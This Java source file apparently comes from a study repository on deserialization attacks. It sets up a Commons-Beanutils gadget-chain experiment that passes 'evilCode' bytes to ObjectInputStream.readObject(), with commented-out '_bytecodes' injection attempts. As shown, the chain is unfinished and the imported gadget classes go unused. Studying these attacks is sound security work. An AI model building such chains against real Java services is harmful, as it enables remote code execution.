package com.govuln.deserialization;

import com.govuln.serialization.SerializeUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;

import java.util.PriorityQueue;

public class CommonsBeanutils3 {
    public static void main(String[] args) throws Exception{
        byte[] evilCode = SerializeUtil.getEvilCode();
//        Person person = new Person();
//        SerializeUtil.setFieldValue(person,"_bytecodes",evilCode);
//        PropertyUtils.getProperty(person,"_bytecodes");
//        byte[] _bytecodes= (byte[]) PropertyUtils.getProperty(person,"_bytecodes");
        ByteArrayInputStream bis = new ByteArrayInputStream(evilCode);
        ObjectInputStream ois = new ObjectInputStream(bis);
        ois.readObject();
    }
}
